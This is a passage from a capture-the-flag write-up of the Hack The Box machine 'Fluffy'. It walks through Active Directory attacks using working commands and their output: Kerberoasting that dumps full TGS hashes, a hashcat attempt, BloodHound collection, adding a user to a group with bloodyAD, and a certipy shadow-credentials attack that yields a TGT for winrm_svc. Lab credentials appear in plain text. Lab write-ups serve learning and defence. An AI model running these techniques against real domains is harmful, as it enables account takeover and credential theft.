</span><span id="__span-26-47"><a id="__codelineno-26-47" name="__codelineno-26-47" href="#__codelineno-26-47"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Network<span class="w"> </span>Configuration<span class="w"> </span>Operators<span class="w">          </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-48"><a id="__codelineno-26-48" name="__codelineno-26-48" href="#__codelineno-26-48"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Remote<span class="w"> </span>Desktop<span class="w"> </span>Users<span class="w">                     </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-49"><a id="__codelineno-26-49" name="__codelineno-26-49" href="#__codelineno-26-49"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Replicator<span class="w">                               </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-50"><a id="__codelineno-26-50" name="__codelineno-26-50" href="#__codelineno-26-50"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Backup<span class="w"> </span>Operators<span class="w">                         </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-51"><a id="__codelineno-26-51" name="__codelineno-26-51" href="#__codelineno-26-51"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Print<span class="w"> </span>Operators<span class="w">                          </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-52"><a id="__codelineno-26-52" name="__codelineno-26-52" href="#__codelineno-26-52"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Guests<span class="w">                                   </span>membercount:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-26-53"><a id="__codelineno-26-53" name="__codelineno-26-53" href="#__codelineno-26-53"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Users<span class="w">                                    </span>membercount:<span class="w"> </span><span class="m">3</span>
</span><span id="__span-26-54"><a id="__codelineno-26-54" name="__codelineno-26-54" href="#__codelineno-26-54"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Administrators<span class="w">                           </span>membercount:<span class="w"> </span><span class="m">3</span>
</span></code></pre></div><br />
we see lots of groups. </p>
<hr />
<p>[TODO] -&gt; could i run bloodhound with the initial user? if yes add it here too prior to doing the foothold <br />
[TODO] -&gt; had no patience, but is this way going to work in general? (except the fact that i did not run bloodhound to understand whats going on exaclty)</p>
<h3 id="finding-hashes-of-kerberoastable-accounts">Finding hashes of kerberoastable accounts</h3>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>GetUserSPNs.py<span class="w"> </span>fluffy.htb/p.agila:prometheusx-303<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.69<span class="w"> </span>-request
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>└──╼<span class="w"> </span><span class="nv">$python3</span><span class="w"> </span>GetUserSPNs.py<span class="w"> </span>fluffy.htb/p.agila:prometheusx-303<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.69<span class="w"> </span>-request
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>Impacket<span class="w"> </span>v0.13.0.dev0+20250530.173014.ff8c200f<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>ServicePrincipalName<span class="w">    </span>Name<span class="w">       </span>MemberOf<span class="w">                                       </span>PasswordLastSet<span class="w">             </span>LastLogon<span class="w">                   </span>Delegation<span class="w"> </span>
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>----------------------<span class="w">  </span>---------<span class="w">  </span>---------------------------------------------<span class="w">  </span>--------------------------<span class="w">  </span>--------------------------<span class="w">  </span>----------
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>ADCS/ca.fluffy.htb<span class="w">      </span>ca_svc<span class="w">     </span><span class="nv">CN</span><span class="o">=</span>Service<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb<span class="w">  </span><span class="m">2025</span>-04-17<span class="w"> </span><span class="m">19</span>:07:50.136701<span class="w">  </span><span class="m">2025</span>-05-22<span class="w"> </span><span class="m">01</span>:21:15.969274<span class="w">             </span>
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>LDAP/ldap.fluffy.htb<span class="w">    </span>ldap_svc<span class="w">   </span><span class="nv">CN</span><span class="o">=</span>Service<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb<span class="w">  </span><span class="m">2025</span>-04-17<span class="w"> </span><span class="m">19</span>:17:00.599545<span class="w">  </span>&lt;never&gt;<span class="w">                                </span>
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>WINRM/winrm.fluffy.htb<span class="w">  </span>winrm_svc<span class="w">  </span><span class="nv">CN</span><span class="o">=</span>Service<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb<span class="w">  </span><span class="m">2025</span>-05-18<span class="w"> </span><span class="m">03</span>:51:16.786913<span class="w">  </span><span class="m">2025</span>-06-04<span class="w"> </span><span class="m">04</span>:33:27.044985<span class="w">             </span>
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>CCache<span class="w"> </span>file<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>found.<span class="w"> </span>Skipping...
</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Kerberos<span class="w"> </span>SessionError:<span class="w"> </span>KRB_AP_ERR_SKEW<span class="o">(</span>Clock<span class="w"> </span>skew<span class="w"> </span>too<span class="w"> </span>great
</span></code></pre></div></p>
<p>Lets sync with the domain and try again<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>ntpdate<span class="w"> </span>fluffy.htb
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>python3<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>fluffy.htb/p.agila:prometheusx-303<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.69<span class="w"> </span>-request
</span></code></pre></div><br />
output:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:07:50.136701  2025-05-22 01:21:15.969274             
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:17:00.599545  &lt;never&gt;                                
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 03:51:16.786913  2025-06-04 04:33:27.044985             
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>[-] CCache file is not found. Skipping...
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$3f61cb5c82fab8ea78b41b82f4a9ed91$760e1176c349bbe95651bb7bc478312adf7246d6bf4b2eec568f2197cf1f502b1575c7c4f6f7c8361e4a913162abe0a664169f44b30e435f1efac0e99730993f38fbbfffa1e84fd7209d36d67d69eac8a779444d23d4ebfdbff025c5c6e60addb93310e289f86006fde5a86c45ff79b2677ec8466e2e077ff51d1ec813c8729363368f8c4eddb87344ef2189f84da99658d86a995f98b3ccdfaad9d21a9c9da5af9d287a88dbdf74a07fe9d4aab0a714db10b064d03996dfcda7a71e2ba72e5ac7c67cf708644733593ff2987f096b3d7fb7b3ec22fbcbd4cc81100d950c778d3e17533d128924f11c9990a968039b9e7549fa44b7c42b0890a2d90b86a9d932c7f4f00793a64a978e878f03b531582b60606f55da46f0f00fdb7d64f9782ce15d6c8aba05f815941267b1d349ca7004a0c39731863824eafedda03ef4093ef40ea5ffcba9848af0f844f6c551730da8fe2cda2528882d839fe4e521b26885a4fa5b825d4458894f5b2c821e70ff31da70e558aa5c5bce791eed7e09dc808dc4ed7e53b54a9a4b9b6109da0e4143b64b6588717e02b9b3e407b53eb262b9be4e48cad6e3e150f8c5b5690b923fa465d13bb34fefa22fe7082aa36df7068f268af1e287e97743c61d6ef16001dd45eadba8397487311d79e210aa1f98df3398533a9c9774b15b3ee74a74b194725aeaffc2905acc393bd75aa46c3f3b9caacab38817cff747888efbf20dc05f70bbaa535cdf3acd0778eef347076f14d2f70661dcdd5b17366574b92b6c0aaa6038dc9a4180bb4e3676f96740fb209f1c7bddc52caf74ef2c97e5c3fbf2de31aa0ac545274094f392981b3111fed09759cfc4386da46d7081957754a002493df6b7a4a16e49f4b82fe07795ff6383ce37c2eedc4188fdf49115768c18bd562d23a0ca3859627f6a592d032a56a77c31059d71e49e75443d28b695dcad129c54cb4ee82f57c554e6e3d0dcc0bb749ec3fea7fa4ba3f879d17ad1f29e71db0b3f4a1784a42bb2d8ea892e1e4a616dfba28af107628a4d973500ee52459f7b9410c3da4b582559e2a9751e8f6199bb78fdf31a84eeb062ac02bf0c5d59a6772c896ae03e4b051d6ecf1d4f88819a3c6bad436bdb315d22c8c3a77f3329d1718e717436b9c68c159ebf69a3177653c77171fc195654fe198ab6cd761ee72826eeba26fcb2672ab39bc9db0889b178e914c9e6d5a6aefa0ff5bcaa894a2b0ceb95b08be3e6ee3b15a939ef3a50325ea407555b653a3b8670ea22061d3823395fb58a20d6868acbbc267d53cfa1eae6929b194eb038140a5f885b20833e24c9131fbade500aedb93de71a8360213c191e03b73fa695ac36f3e49f7333a77411de6142d4367c9eba47b23e2a6489ecfb19bee5afd6f105cdf2cf05a28513aa61c4725a49fbc4a827550e08d306fb58e639f450623b979e13eebafddd8df0deea6db1b6265291f2f2df2835050dc874686e514be03eadda94b7
</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$775a1ab850490bb54f9d6035783564bf$e9198ec9e9e34d60de08f81af8ff92fdd5228cd56fc8b326c597aec4460c308b03d3312b9ef5fa76fb2714937fb0b12d0123fd3f585b766fe9e4fcc1b38206000b89f008cf8ef73275b6c205660c0b214db64a3e9640dcb4fba64ed19a134433d26dc3479b6c8a9e47cf54bd4a3872e07281a3ccc6a33148e1634731cc6aa1ae2844d8e372e1e4cc3ca6b74f3f9481127571902d8410605b0290ba6dba0bba0ca566935f99c0b03f36c4b37cd7c2ec141b50c44721de33d9801629d969a815430a696416c9ac78dcd20c0f78424c00e6678c3afff5f0fae58c959370506cc1c56f2e6489f4c577dc5c138d04ad0dafbcc43f0f98a8a9014990bf9b8720abacfe279fb436124c2cb5227bf2a2bdfb0ee3068e895ac90f3c5de44105a0d2e78a58264c0bee809b8b2aa38724e94973e3d78cb23a25aafe148ac716fc502aa28516a3a19e73df3fd861a3200cea46b936721a2cd1269b868bf65d77475e083d534a7de3ef170da9b0ba3429b9a9f9fa3b3250b41ffef0bef4a00732f8e76f2350a1cc242df66f5e1e1f120f23221a974a7db662bf8dba78b7fd99993bb3f70c23a9dcbb4e00380152e9b93cb3924636fa15ba49e7fbb268df94eb639101cf0bc328331f0258f7c8aea87497b58b6c134b9ab71daf024ab7b85783378cf83e4cf3811591a8af30d91c0cb5f7358238056a652ae3b590fec8828e49851fb68f112dd5cafb63c6890585bb25fb376fbe64b0cf816f3f908df14ef0503d2b1170b75f1e7355af1994e0caec63d36f13d718e94c4ba56744d250517dfbe80ca085d5fc159c4a019868cc4a13184fddc6f42692d6b121561b3805d36a1a8fbf7b07ea85d97c9a22682c9f7458f62cf0163652f67af349ec5751cf86ed261f5efdd7e505710005ff3a6e3e8eebb13316807d77c99bb0f94217bf338da13f8f6626276d63cccea402225ccab20185b840618767b1f1b4ea1708ccb8bf858d6578decd9c0b3eaa3d141fe8f6dafa8001359ecf5a5510eccbee7fd08ee6ccbc52a3352585b69fd6f30972ad6a5e658717e75f5ba4e5fb5f2295364bd0e96bb0c94bac0f75819004adc702277a1da8d9d4709190ae6e4f9c516daafab76af39e4236711566bfb2d060dad4aa28263e3e17c55cdbd75623aab2c570bbc78123c33f47d3d159c97a806c9d5acda3d649a712d0db70e125dd9a2a5de6f94567465376509aba941dd768620637d99bc4a693624f181ca1b94e1fe29e6e054e35f0e9ae6906ac5523191ccd3cf8ec91a11c7d34841977604eb9a7b36cd7fd49e5fdc8857f2b099fc87d3e734d2db25f8961bbd06154ca32dd8e4b91773b823bd19c964850f79c8c6818031d130883ee43dcb92b385970b482a9e5c81b1f8cfc82a71a6b054cbd8f28a2bc7059f593dffb97a5bed21beba857213a3479269a066fa6b117a428118305fc6d5c44dd9054483bf68c494d7b9a6544983a80d3b925a055feb63c9a804c9631eef0
</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$55e2bb000898ea80138be5e88c4e1e4f$5099f0030807c7c4f3444c8caeab7de469fa97c7a857125a6c0f506d2ccabac9da60271f46834a769e84b5605b5d5127ac72efe61e7611758898ab9226588ca9010e40e8485d22076f98a01052c1734a56c09126407c3ed8cdd35d1701665838ffe24fbfed09a4dc840659294c5970b6f7484254d07ad23a71385a3abf2af69eedc9f60826051cbcb5acd43aab96c7d55ad75dd310cac8a9c6ba94fa6e65dafb6bc1461ca688553f58ddd234c2cc0578419f4630798051b303712065b154af3770a3afc4388c00865a63b11a2f5463c11e1252ea7cc504c50d2940c24665f5adf9e7920341295762c98b57c50c5ddbd2bdd1b35a86b31e03b787fcde9f6e854d7880e2bfb53c71ab3af2055fd1311a5fdcdeb673066bfd7c641e559af6636f078909020aec5b71cdf6676c5e9f9beeb9ba4dda8c21426ea2288103d0228f72ffceeeea5317e715fe0646cadf82b337d95cb61e3590a91535d9ddfb9126203c797406bcbf9a8250c6ad2995b980cde4d3255b766cd23a9873bbc8267ad2ade206b8087aa86add94638c6a4cc85341106c818034e79007fa13e766652eeb15263117c5b4e3bb708632ac416550fa4c1f470d0484a7157fd39bd021e70445a163305a7031ab3636d100fa1e776e280980111940e9b6e69fccdf4a815ec30e76e5155569e31af8ad041f065365fdc46b3b0f8ac162f7dac20ab6eddf235765de93102e58951abf94fa0691800d9396dc31047159c4f688469d7ece16165b3332920461897d3fa4fafc5cac2332fe1323154398c3cc1ddc08025531e0cd5b80b95d5b9e46256fd60cabc9f1be360c590a76324fb1ff52217c162af004c1c1bdd0b24f8ff7f855f7c23628b9b6606ed2a25045fe2980ac533c6eae7d47be985a49603c82c2c297e1aa5e1660662c018b9e08f8279d18139ccea101137bb36c0f4a456da78d3a7c3ed52c478f92adff3ea6c3b7c645f4dec16382b3748688c430b4186946e2291d60407e402e97f276d0665a7bc9fe424afb6c2d51cadab102a00922eb232d6021463cc6d926fb9fed46229cb947dabcd3168b0eeaf20214dec207c1ce1d8aa1664b013fe6108240e3bb6beca7681fb77118f1858ce3d1cfdb72ee9f2d082c7d6907c9309bfa681f0776dceb2559461f301c8543104fbd7c193a3d81809533b01bf84986cf29a7a11e477836c148df7d68d35211064aea88d4cc1cafbd85792aad9298dfd0aa7234337949156b2d6f37b19fa3b0b399a313cd4593cf7e8a53f6cc46cb576526a3125ea7cdc93b6cae39e5d5e49f0861b51ac411e85b1c68d5bfbf7065bba78c58b98f13f26176cfffa777dddace5a65ceeee798ee57c5f4c719a478e65eef199b408838f9b23b04a32a7b102e35a0998d1ccfa445499c6c0a440050f67f74e0dc846aad11232680760177a43e3a3935d90e7d039f9524f4b9c0c08869bddd8d013decc98253ba4e0872fa6e71c4d7200fd18cb11a9b358da2
</span></code></pre></div><br />
we got a hashes related to service tickets (TGS), one for <code>ca_svc</code> and one for <code>winrm_svc</code></p>
<h3 id="attempting-to-crack-hashes">Attempting to crack hashes</h3>
<p>Unfortunately when running hashcat like this: <br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>hash.txt<span class="w"> </span>rockyou.txt<span class="w"> </span>--force
</span></code></pre></div><br />
the hashes appeared to be uncrackable! This means either the password is too complex, or we are using wrong cracking configuration. We must find another way....</p>
<h2 id="bloodhound-as-pagila">Bloodhound as p.agila</h2>
<p>We can also use bloodhound to see the bigger picture:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w">  </span>-d<span class="w"> </span>fluffy.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.10.11.69<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div></p>
<p>First, found the group membership of p.agila<br />
<img alt="Pasted image 20250604004457" src="../MediaFiles/Pasted%20image%2020250604004457.png" /></p>
<p>lets inspect the service account managers: (outbound object control)<br />
<img alt="Pasted image 20250604004719" src="../MediaFiles/Pasted%20image%2020250604004719.png" /></p>
<p>lets now inspect service accounts: (outbound object control)<br />
<img alt="Pasted image 20250604004819" src="../MediaFiles/Pasted%20image%2020250604004819.png" /><br />
this group has  <code>GenericWrite</code> permissions over those service accounts</p>
<p>lets also see Group membership for each one of those service accounts<br />
- ldap_svc<br />
<img alt="Pasted image 20250604005109" src="../MediaFiles/Pasted%20image%2020250604005109.png" /><br />
- winrm_svc<br />
<img alt="Pasted image 20250604005136" src="../MediaFiles/Pasted%20image%2020250604005136.png" /><br />
- ca_svc<br />
<img alt="Pasted image 20250604005032" src="../MediaFiles/Pasted%20image%2020250604005032.png" /><br />
hm, we see cert publishers here.. seems interesting</p>
<p>So this will be our path, targeting cert_publishers</p>
<h2 id="add-user-to-group">Add user to group</h2>
<p>First <code>p.agila</code>add it to the SERVICE ACCOUNTS group<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;dc01.fluffy.htb&#39;</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w">  </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s1">&#39;SERVICE ACCOUNTS&#39;</span><span class="w"> </span>p.agila
</span></code></pre></div><br />
output<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>[+] p.agila added to SERVICE ACCOUNTS
</span></code></pre></div><br />
okay we added the user to SERVICE ACCOUNTS, but whats next?</p>
<p>Lets remember the outbound object control of SERVICE ACCOUNTS:<br />
<img alt="Pasted image 20250604004819" src="../MediaFiles/Pasted%20image%2020250604004819.png" /><br />
it has <code>GenericWrite</code> over those 3 users, what can we do with it?</p>
<p>This one helped me choose what to do next: <a href="https://www.thehacker.recipes/ad/movement/dacl/" title="https://www.thehacker.recipes/ad/movement/dacl/">https://www.thehacker.recipes/ad/movement/dacl/</a></p>
<h5 id="how-to-take-advantage-of-genericwrite">How to take advantage of GenericWrite ?</h5>
<p><strong>GenericWrite</strong> privilege can do the following :<br />
- Allows modification a multitude of target object's attributes. For example certificate/key related attributes such as <code>msDS-KeyCredentialLink</code>.<br />
- Adding entries to <code>msDS-KeyCredentialLink</code> is precisely how <strong>shadow credentials</strong> are stored in AD (public-key blobs / KeyCredential objects).<br />
- Therefore an identity with GenericWrite can add a KeyCredential (public key) to a service account object, enabling a holder of the private key to authenticate as that service account <br />
Put another way: GenericWrite → ability to change key/certificate attributes → ability to add KeyCredential entries → attacker can authenticate with a private key as the target account = <strong>shadow cred</strong> capability.</p>
<h5 id="what-are-shadow-credentials">What are shadow credentials ?</h5>
<p>Shadow credentials are <strong>certificate-based credentials</strong> that get attached to an Active Directory account so that the holder of the corresponding private key can authenticate as that account — without ever knowing the account’s password.</p>
<p>Technically they show up in AD as entries under attributes like <code>msDS-KeyCredentialLink</code> / KeyCredential objects (a “key credential” / public key blob tied to the object). Windows accepts those key entries for certain auth flows (e.g. certificate-based authentication / certificate logon, WinRM / Negotiate if configured, ADFS/OAuth flows in some deployments), so if you can add such a key to an account, you can <mark>impersonate</mark> it using the private key — password not required.</p>
<h2 id="adding-shadow-credential">Adding Shadow Credential</h2>
<h3 id="towards-winrm_svc">Towards WINRM_SVC</h3>
<p>lets sync with the machine's dc<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>ntpdate<span class="w"> </span>fluffy.htn
</span></code></pre></div><br />
then<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila@fluffy.htb&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w">  </span>-account<span class="w"> </span><span class="s1">&#39;WINRM_SVC&#39;</span><span class="w">  </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span>
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>└─#<span class="w"> </span>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila@fluffy.htb&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w">  </span>-account<span class="w"> </span><span class="s1">&#39;WINRM_SVC&#39;</span><span class="w">  </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Targeting<span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>certificate
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>generated
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>Key<span class="w"> </span>Credential
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Key<span class="w"> </span>Credential<span class="w"> </span>generated<span class="w"> </span>with<span class="w"> </span>DeviceID<span class="w"> </span><span class="s1">&#39;688de985-f73a-14b9-884e-33a1d3158056&#39;</span>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>Key<span class="w"> </span>Credential<span class="w"> </span>with<span class="w"> </span>device<span class="w"> </span>ID<span class="w"> </span><span class="s1">&#39;688de985-f73a-14b9-884e-33a1d3158056&#39;</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span>Key<span class="w"> </span>Credential<span class="w"> </span>with<span class="w"> </span>device<span class="w"> </span>ID<span class="w"> </span><span class="s1">&#39;688de985-f73a-14b9-884e-33a1d3158056&#39;</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Authenticating<span class="w"> </span>as<span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span><span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>certificate
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>winrm_svc@fluffy.htb
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT
</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>credential<span class="w"> </span>cache<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;winrm_svc.ccache&#39;</span>
